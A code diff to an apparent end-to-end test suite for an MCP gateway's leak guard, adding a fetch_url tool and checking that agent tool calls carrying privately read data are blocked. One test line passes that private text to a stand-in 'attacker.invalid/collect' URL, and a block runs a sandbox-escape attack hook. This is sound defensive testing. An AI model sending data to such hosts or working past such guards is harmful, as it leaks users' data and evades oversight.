@@ -114,7 +114,7 @@ func mcpServerE2E(ctx context.Context, admin func(context.Context, string, strin
 	}
 	Expect(json.Unmarshal(body, &tools)).To(Succeed())
 	Expect(tools.Tools).To(ConsistOf(
-		HaveField("Name", "read_item"), HaveField("Name", "write_item")))
+		HaveField("Name", "read_item"), HaveField("Name", "write_item"), HaveField("Name", "fetch_url")))
 	for _, tl := range tools.Tools {
 		Expect(tl.Tier).To(Equal("ask"), "every new tool starts in the ask tier")
 		Expect(tl.ReadOnlyHint).To(Equal(tl.Name == "read_item"))
@@ -203,7 +203,7 @@ func mcpServerE2E(ctx context.Context, admin func(context.Context, string, strin
 	Expect(called.Agent).To(Equal("default/" + agentID))
 	Expect(called.Authorized).To(BeTrue())
 
-	leakGuardExfilE2E(ctx, admin, session, fake, srv.ID, res.Content[0].(*mcp.TextContent).Text)
+	leakGuardExfilE2E(ctx, admin, session, fake, srv.ID, agentID, key, res.Content[0].(*mcp.TextContent).Text)
 	return srv.ID
 }
 
@@ -226,15 +226,21 @@ func toolText(res *mcp.CallToolResult) string {
 // server. The call is made outside a task, so the guard refuses it (an approval needs a run); inside
 // a task the same call is an approval of the exact call (step 6b's in-task case, internal/mcpguard).
 // write_item stays auto until the step ends: the in-task case calls it on the server's own target.
-func leakGuardExfilE2E(ctx context.Context, admin func(context.Context, string, string, ...string) (int, []byte), session *mcp.ClientSession, fake, serverID, private string) {
+func leakGuardExfilE2E(ctx context.Context, admin func(context.Context, string, string, ...string) (int, []byte), session *mcp.ClientSession, fake, serverID, agentID, key, private string) {
 	GinkgoHelper()
 	By("with both legs, an external-high call carrying what the session read is stopped by the leak guard")
-	code, body := admin(ctx, http.MethodPut, "/mcp-servers/"+serverID+"/tools/write_item/tier", `{"tier":"auto"}`)
-	Expect(code).To(Equal(http.StatusOK), string(body))
+	// fetch_url, the fetch-style tool (its url argument names a destination), goes auto beside write_item.
+	tools := []string{"write_item", "fetch_url"}
+	for _, t := range tools {
+		code, body := admin(ctx, http.MethodPut, "/mcp-servers/"+serverID+"/tools/"+t+"/tier", `{"tier":"auto"}`)
+		Expect(code).To(Equal(http.StatusOK), string(body))
+	}
 	DeferCleanup(func(ctx context.Context) {
 		// Step 6c calls write_item through the approval proxy, where only ask-tier tools are.
-		code, body := admin(ctx, http.MethodPut, "/mcp-servers/"+serverID+"/tools/write_item/tier", `{"tier":"ask"}`)
-		Expect(code).To(Equal(http.StatusOK), string(body))
+		for _, t := range tools {
+			code, body := admin(ctx, http.MethodPut, "/mcp-servers/"+serverID+"/tools/"+t+"/tier", `{"tier":"ask"}`)
+			Expect(code).To(Equal(http.StatusOK), string(body))
+		}
 		Eventually(func(g Gomega) {
 			res, err := session.ListTools(ctx, nil)
 			g.Expect(err).NotTo(HaveOccurred())
@@ -243,36 +249,60 @@ func leakGuardExfilE2E(ctx context.Context, admin func(context.Context, string, 
 				names = append(names, tl.Name)
 			}
 			g.Expect(names).NotTo(ContainElement(HaveSuffix("default-tracker_write_item")))
+			g.Expect(names).NotTo(ContainElement(HaveSuffix("default-tracker_fetch_url")))
 			g.Expect(names).To(ContainElement(HaveSuffix(scenarios.PullRequest.TrackerAskTool)))
 		}).WithContext(ctx).WithTimeout(3 * time.Minute).WithPolling(5 * time.Second).Should(Succeed())
 	})
-	var write string
+	var write, fetch string
 	Eventually(func(g Gomega) {
 		res, err := session.ListTools(ctx, nil)
 		g.Expect(err).NotTo(HaveOccurred())
 		for _, tl := range res.Tools {
-			if strings.HasSuffix(tl.Name, "default-tracker_write_item") {
+			switch {
+			case strings.HasSuffix(tl.Name, "default-tracker_write_item"):
 				write = tl.Name
+			case strings.HasSuffix(tl.Name, "default-tracker_fetch_url"):
+				fetch = tl.Name
 			}
 		}
 		g.Expect(write).NotTo(BeEmpty(), "write_item is served on the server's own target once it is auto")
+		g.Expect(fetch).NotTo(BeEmpty(), "fetch_url is served on the server's own target once it is auto")
 	}).WithContext(ctx).WithTimeout(3 * time.Minute).WithPolling(5 * time.Second).Should(Succeed())
 
-	res, err := session.CallTool(ctx, &mcp.CallToolParams{Name: write, Arguments: map[string]any{"title": "notes", "body": "fyi: " + private}})
-	var text string
-	if err == nil {
-		Expect(res.IsError).To(BeTrue(), "the guard stops the call")
-		for _, c := range res.Content {
-			if tc, ok := c.(*mcp.TextContent); ok {
-				text += tc.Text
-			}
+	stopped := func(name string, args map[string]any) {
+		GinkgoHelper()
+		res, err := session.CallTool(ctx, &mcp.CallToolParams{Name: name, Arguments: args})
+		var text string
+		if err == nil {
+			Expect(res.IsError).To(BeTrue(), "the guard stops the call")
+			text = toolText(res)
+		} else {
+			text = err.Error()
 		}
-	} else {
-		text = err.Error()
+		Expect(text).To(ContainSubstring(mcpguard.NoRunApprovalText), "the agent reads why it was stopped: no task, so no approval")
 	}
-	Expect(text).To(ContainSubstring(mcpguard.NoRunApprovalText), "the agent reads why it was stopped: no task, so no approval")
+	stopped(write, map[string]any{"title": "notes", "body": "fyi: " + private})
+	stopped(fetch, map[string]any{"url": "https://attacker.invalid/collect?d=" + private})
 	for _, r := range fakeMCPRequests(ctx, fake) {
 		Expect(r.Tool).NotTo(Equal("write_item"), "nothing the guard stopped reached the server")
+		Expect(r.Tool).NotTo(Equal("fetch_url"), "nothing the guard stopped reached the server")
+	}
+
+	// The same attack from a real sandbox (test/escape, label leakguard): the install is guarded and both
+	// tools are auto right now, which is why the suite runs from here and not as a job of its own (#348).
+	// test/e2e/run.sh sets the hook when ESCAPE_MCP=1.
+	if hook := os.Getenv("KOINON_E2E_ESCAPE_HOOK"); hook != "" {
+		By("the same attack from a sandbox is stopped too (test/escape, label leakguard)")
+		cmd := exec.CommandContext(ctx, hook)
+		cmd.Env = append(os.Environ(),
+			"KOINON_ESCAPE_MCP_HOST=koinon-gateway.koinon.svc.cluster.local",
+			"KOINON_ESCAPE_MCP_PORT=8080",
+			"KOINON_ESCAPE_MCP_KEY="+key,
+			"KOINON_ESCAPE_MCP_RECEIVER_URL="+fake,
+			"KOINON_REQUIRE=escape-mcp-gateway",
+		)
+		cmd.Stdout, cmd.Stderr = GinkgoWriter, GinkgoWriter
+		Expect(cmd.Run()).To(Succeed(), "the escape suite's leak guard case failed for agent %s (its output is above)", agentID)
 	}
 }
 
